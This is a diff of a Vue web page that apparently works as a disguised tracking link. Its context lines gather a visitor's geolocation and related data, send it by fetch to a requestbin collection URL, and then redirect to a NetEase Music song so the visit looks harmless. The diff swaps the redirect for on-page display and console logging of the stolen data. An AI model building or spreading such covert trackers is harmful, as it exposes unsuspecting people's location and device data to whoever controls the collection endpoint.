@@ -9,7 +9,7 @@
 
 <body>
     <script src="https://unpkg.com/vue@3/dist/vue.global.js"></script>
-    <div id="app"></div>
+    <div id="app">{{msg}}</div>
     <script>
         const { createApp } = Vue
 
@@ -17,7 +17,9 @@
             data() {
                 return {
                     requestbin: 'http://requestbin.cn:80/1nxn2271',
-                    target: "https://music.163.com/#/song?id=368800"  // 网易云 牛奶咖啡 - 越长大越孤单
+                    target: "https://music.163.com/#/song?id=368800",  // 网易云 牛奶咖啡 - 越长大越孤单
+
+                    msg: ""
                 }
             },
             created() {
@@ -37,9 +39,12 @@
                         },
                         body: JSON.stringify(result)
                     }).then(() => {
-                        window.location.replace(this.target)
+                        this.msg=JSON.stringify(result)
+                        console.log(result);
+                        // window.location.replace(this.target)
                     }).catch((error)=>{
                         console.log(error);
+                        console.log("sendReport出错");
                     })
                 },
                 getCoordinates(position) {
